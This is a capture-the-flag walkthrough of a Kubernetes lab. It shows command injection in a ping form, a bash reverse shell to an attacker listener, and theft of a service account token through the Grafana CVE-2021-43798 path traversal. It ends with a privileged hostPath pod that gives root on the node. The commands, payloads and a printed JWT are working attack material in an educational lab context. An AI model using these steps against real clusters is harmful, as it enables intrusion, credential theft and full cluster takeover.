## **Insekube**

starting off with port scan,
```
22/tcp open  ssh     
80/tcp open  http
```

browsing to website, we see that we can ping any ip.
IDOR vibes in URL, cuz
```
<ip>/?hostname=127.0.0.1
```
tried ;whoami
```
http://<ip>/?hostname=127.0.0.1;whoami

# Result as follows

PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.021 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.031 ms

--- 127.0.0.1 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1010ms
rtt min/avg/max/mdev = 0.021/0.026/0.031/0.005 ms
challenge


```

Trying to spawn rev shell, 
```
127.0.0.1;bash -i >& /dev/tcp/<LHOST>/4444 0>&1

# And starting pwncat-cs rev shell listener,

pwncat-cs
listen -m linux 4444

# We land a rev shell as challange@syringe


```
given that first flag is in environment variables,
```
printenv

FLAG=flag{xxxxxxxxxxxxxxxxxxxxxxxxxxx}
```
Kubernetes exposes an HTTP API to control the cluster. All resources in the cluster can be accessed and modified through this API. The easiest way to interact with the API is to use the kubectl CLI. You could also interact with the API directly using curl or wget if you don't have write access and kubectl is not already present, Here is a good article on that.

The kubectl install instructions can be found here. However, the binary is located in the /tmp directory. In the event you run into a scenario where the binary is not available, it's as simple as downloading the binary to your machine and serving it (with a python HTTP server for example) so it is accessible from the container.

Now let's move to the /tmp directory where the kubectl  is conveniently located for you and try the kubectl get pods command. You'll notice a  forbidden error which means the service account running this pod does not have enough permissions.

You can check your permissions using kubectl auth can-i --list. The results show this service account can list and get secrets in this namespace.

```
Resources                                       Non-Resource URLs                     Resource Names   Verbs
selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
secrets                                         []                                    []               [get list]
```
Use kubectl describe secret secretflag to list all data contained in the secret. Notice the flag data isn't being outputted with this command, so let's choose the JSON output format with: kubectl get secret secretflag -o 'json'

```
./kubectl get secret secretflag -o "json"

{
    "apiVersion": "v1",
    "data": {
        "flag": "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx="
    },
    "kind": "Secret",
    "metadata": {
        "annotations": {
            "kubectl.kubernetes.io/last-applied-configuration": "{\"apiVersion\":\"v1\",\"data\":{\"flag\":\"ZmxhZ3tkZjJhNjM2ZGUxNTEwOGE0ZGM0MTEzNWQ5MzBkOGVjMX0=\"},\"kind\":\"Secret\",\"metadata\":{\"annotations\":{},\"name\":\"secretflag\",\"namespace\":\"default\"},\"type\":\"Opaque\"}\n"
        },
        "creationTimestamp": "2022-01-06T23:41:19Z",
        "name": "secretflag",
        "namespace": "default",
        "resourceVersion": "562",
        "uid": "6384b135-4628-4693-b269-4e50bfffdf21"
    },
    "type": "Opaque"
}

```

decode the flag with base64,
```
flag{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}
```

Some interesting Kubernetes objects to look for would be nodes,  deployments, services, ingress, jobs... But the service account you control does not have access to any of them.

However, by default Kubernetes creates environment variables containing the host and port of the other services running in the cluster.

Running env you will see there is a Grafana service running in the cluster.

```
env

KUBERNETES_SERVICE_PORT_HTTPS=443
GRAFANA_SERVICE_HOST=10.108.133.228
KUBERNETES_SERVICE_PORT=443
HISTCONTROL=ignorespace
HOSTNAME=syringe-79b66d66d7-7mxhd
SYRINGE_PORT=tcp://10.99.16.179:3000
GRAFANA_PORT=tcp://10.108.133.228:3000
SYRINGE_SERVICE_HOST=10.99.16.179
SYRINGE_PORT_3000_TCP=tcp://10.99.16.179:3000
GRAFANA_PORT_3000_TCP=tcp://10.108.133.228:3000
PWD=/tmp
SYRINGE_PORT_3000_TCP_PROTO=tcp
HOME=/home/challenge
KUBERNETES_PORT_443_TCP=tcp://10.96.0.1:443
LS_COLORS=
GOLANG_VERSION=1.15.7
FLAG=flag{xxxxxxxxxxxxxxxxxxxxxxx}
TERM=xterm-256color
SHLVL=3
SYRINGE_PORT_3000_TCP_PORT=3000
GRAFANA_PORT_3000_TCP_PORT=3000
KUBERNETES_PORT_443_TCP_PROTO=tcp
KUBERNETES_PORT_443_TCP_ADDR=10.96.0.1
GRAFANA_SERVICE_PORT=3000
SYRINGE_PORT_3000_TCP_ADDR=10.99.16.179
SYRINGE_SERVICE_PORT=3000
PS1=$(command printf "\[\033[01;31m\](remote)\[\033[0m\] \[\033[01;33m\]$(whoami)@$(hostname)\[\033[0m\]:\[\033[1;36m\]$PWD\[\033[0m\]\$ ")
KUBERNETES_SERVICE_HOST=10.96.0.1
KUBERNETES_PORT=tcp://10.96.0.1:443
KUBERNETES_PORT_443_TCP_PORT=443
GRAFANA_PORT_3000_TCP_PROTO=tcp
PATH=/usr/local/go/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
GRAFANA_PORT_3000_TCP_ADDR=10.108.133.228
_=/usr/bin/env
OLDPWD=/var/tmp
```
We see Grafana service running in this cluster.

```
curl http://10.108.133.228:3000/login
```
skimming through the output, we see **version":"x.x.x-xxxxx"**

Simple "grafana exploit" google shows CVE-2021-43798 exploit.

googled the CVE again, found https://github.com/julesbozouklian/CVE-2021-43798

```
# Grafana unauthorized arbitrary file reading vulnerability
# curl --path-as-is http://IP:3000/URL_PATH

curl --path-as-is http://10.108.133.228:3000/public/plugins/alertlist/../../../../../../../../etc/passwd

bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
grafana:x:472:0:Linux User,,,:/home/grafana:/sbin/nologin


curl --path-as-is http://10.108.133.228:3000/public/plugins/alertlist/../../../../../../../../var/run/secrets/kubernetes.io/serviceaccount/token

eyJhbGciOiJSUzI1NiIsImtpZCI6Im82QU1WNV9qNEIwYlV3YnBGb1NXQ25UeUtmVzNZZXZQZjhPZUtUb21jcjQifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjc3NDg4ODE2LCJpYXQiOjE2NDU5NTI4MTYsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJncmFmYW5hLTU3NDU0Yzk1Y2ItdjRucmsiLCJ1aWQiOiJmMmJkMTczZS1iNjU3LTQyNTMtYTM2NC1lNzA5ZDczMWZhMTIifSwic2VydmljZWFjY291bnQiOnsibmFtZSI6ImRldmVsb3BlciIsInVpZCI6IjE5NjdmYzMwLTQxYjktNDJjZC1hZGI3LWZhYjZkYWUxNDhmNiJ9LCJ3YXJuYWZ0ZXIiOjE2NDU5NTY0MjN9LCJuYmYiOjE2NDU5NTI4MTYsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRldmVsb3BlciJ9.OdgTSmVJLSO-UyrCdFshHdMa5K_sqQv96oXThQqvAbLZBsFv891_Kk5s8ZkVQ03LP-EgD9TQ5-KSG0UIRr-Bvd8nAdutNCd_D7_Elw3KrQtajgoV1XAccBAltx6e59tvTBHg2i1g80bxpkJP2iU9pvxsAljC3CvNPwMm_Vs2f9Vqs5-oqJ_rJZ8rV9Kaas6y_HZZ_0SAL2VmqPjzX85UxePNd8_Aoz6Ehlum8r42oWkFRm9VhfoREEYebAxDBmbImE-UMIslu8LCs8Y8KwtnUNJIfnjhhOoUp5cuOxUelwhVb2EmRIGkmSmoiR80e9Rc5lZ8v02ohepPZa0hNu7X-g
```
Kubernetes stores the token of the service account running a pod in /var/run/secrets/kubernetes.io/serviceaccount/token.   

Use the LFI vulnerability to extract the token. The token is a JWT signed by the cluster.

Use the --token flag in kubectl to use the new service account. Once again use kubectl to check the permissions of this account.

```
./kubectl auth can-i --list --token=eyJhbGciOiJSUzI1NiIsImtpZCI6Im82QU1WNV9qNEIwYlV3YnBGb1NXQ25UeUtmVzNZZXZQZjhPZUtUb21jcjQifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjc3NDg4ODE2LCJpYXQiOjE2NDU5NTI4MTYsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJncmFmYW5hLTU3NDU0Yzk1Y2ItdjRucmsiLCJ1aWQiOiJmMmJkMTczZS1iNjU3LTQyNTMtYTM2NC1lNzA5ZDczMWZhMTIifSwic2VydmljZWFjY291bnQiOnsibmFtZSI6ImRldmVsb3BlciIsInVpZCI6IjE5NjdmYzMwLTQxYjktNDJjZC1hZGI3LWZhYjZkYWUxNDhmNiJ9LCJ3YXJuYWZ0ZXIiOjE2NDU5NTY0MjN9LCJuYmYiOjE2NDU5NTI4MTYsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRldmVsb3BlciJ9.OdgTSmVJLSO-UyrCdFshHdMa5K_sqQv96oXThQqvAbLZBsFv891_Kk5s8ZkVQ03LP-EgD9TQ5-KSG0UIRr-Bvd8nAdutNCd_D7_Elw3KrQtajgoV1XAccBAltx6e59tvTBHg2i1g80bxpkJP2iU9pvxsAljC3CvNPwMm_Vs2f9Vqs5-oqJ_rJZ8rV9Kaas6y_HZZ_0SAL2VmqPjzX85UxePNd8_Aoz6Ehlum8r42oWkFRm9VhfoREEYebAxDBmbImE-UMIslu8LCs8Y8KwtnUNJIfnjhhOoUp5cuOxUelwhVb2EmRIGkmSmoiR80e9Rc5lZ8v02ohepPZa0hNu7X-g

*.*                                             []                                    []               [*]

```
The account can do * verb on *.* resource. This means it is a cluster-admin. With this service account, you will be able to run any kubectl command. For example, try getting a list of pods.

```
./kubectl get pods --token=${TOKEN}

NAME                       READY   STATUS    RESTARTS       AGE
grafana-57454c95cb-v4nrk   1/1     Running   10 (17d ago)   41d
syringe-79b66d66d7-7mxhd   1/1     Running   1 (17d ago)    18d
```

Use kubectl exec to get a shell in the Grafana pod. You will find flag 3 in the environment variables.
```
./kubectl exec -it grafana-57454c95cb-v4nrk --token=${TOKEN} -- /bin/bash

bash-5.1$ whoami
grafana

printenv
FLAG=flag{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}
```
You can now close the Grafana pod shell and continue using the first one since it is more stable.

Having admin access to the cluster you can create any resources you want. This article explains how to get access to the Kubernetes nodes by running a pod that mounts the node's file system.

You can create a "bad" pod based on their first case example. You will need a slight modification because the VM does not have an internet connection, therefore it is not able to pull the ubuntu container image. The image is available in minikube's local docker registry therefore you just need to tell Kubernetes to use the local version instead of pulling it. You can achieve this by adding imagePullPolicy: IfNotPresent to your "bad" pod container. Once that is done you can run kubectl apply to create the pod. Then kubectl exec into the new pod, you will find the node's file system mounted on /host.
```
# Content of my "bad" pod,

#imagePullPolicy: IfNotPresent
apiVersion: v1
kind: Pod
metadata:
  name: everything-allowed-pod-new
  labels:
    app: pentest
spec:
  hostNetwork: true
  hostPID: true
  hostIPC: true
  containers:
  - name: everything-allowed-pod
    image: ubuntu
    imagePullPolicy: IfNotPresent
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: noderoot
    command: [ "/bin/sh", "-c", "--" ]
    args: [ "while true; do sleep 30; done;" ]
  #nodeName: k8s-control-plane-node # Force your pod to run on the control-plane node by uncommenting this line and changing to a control-plane node name
  volumes:
  - name: noderoot
    hostPath:
      path: /

# saved it as everything-allowed-exec-pod.yaml
```
upload the file to shell through python server and wget.
```
./kubectl apply -f everything-allowed-exec-pod.yml --token=${TOKEN}

pod/everything-allowed-pod-new created


./kubectl get pods --token=

NAME                         READY   STATUS    RESTARTS       AGE
everything-allowed-pod-new   1/1     Running   0              26s
grafana-57454c95cb-v4nrk     1/1     Running   10 (27d ago)   51d
syringe-79b66d66d7-7mxhd     1/1     Running   1 (27d ago)    27d

./kubectl exec -it everything-allowed-pod-new --token=eyJhbGciOiJSUzI1NiIsImtpZCI6Im82QU1WNV9qNEIwYlV3YnBGb1NXQ25UeUtmVzNZZXZQZjhPZUtUb21jcjQifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjc3NDg4ODE2LCJpYXQiOjE2NDU5NTI4MTYsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJncmFmYW5hLTU3NDU0Yzk1Y2ItdjRucmsiLCJ1aWQiOiJmMmJkMTczZS1iNjU3LTQyNTMtYTM2NC1lNzA5ZDczMWZhMTIifSwic2VydmljZWFjY291bnQiOnsibmFtZSI6ImRldmVsb3BlciIsInVpZCI6IjE5NjdmYzMwLTQxYjktNDJjZC1hZGI3LWZhYjZkYWUxNDhmNiJ9LCJ3YXJuYWZ0ZXIiOjE2NDU5NTY0MjN9LCJuYmYiOjE2NDU5NTI4MTYsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRldmVsb3BlciJ9.OdgTSmVJLSO-UyrCdFshHdMa5K_sqQv96oXThQqvAbLZBsFv891_Kk5s8ZkVQ03LP-EgD9TQ5-KSG0UIRr-Bvd8nAdutNCd_D7_Elw3KrQtajgoV1XAccBAltx6e59tvTBHg2i1g80bxpkJP2iU9pvxsAljC3CvNPwMm_Vs2f9Vqs5-oqJ_rJZ8rV9Kaas6y_HZZ_0SAL2VmqPjzX85UxePNd8_Aoz6Ehlum8r42oWkFRm9VhfoREEYebAxDBmbImE-UMIslu8LCs8Y8KwtnUNJIfnjhhOoUp5cuOxUelwhVb2EmRIGkmSmoiR80e9Rc5lZ8v02ohepPZa0hNu7X-g -- /bin/bash
root@minikube:/# id
uid=0(root) gid=0(root) groups=0(root)

```
Mentioned that the file system will be mounted to /host,
```
root@minikube:~# cd /host
root@minikube:/host# ls
Release.key  bin  boot  data  dev  docker.key  etc  home  kic.txt  kind  lib  lib32  lib64  libx32  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
root@minikube:/host# cd root
root@minikube:/host/root# ls
root.txt
root@minikube:/host/root# cat root.txt
flag{xxxxxxxxxxxxxxxxxxxxxxx}
```
Done!
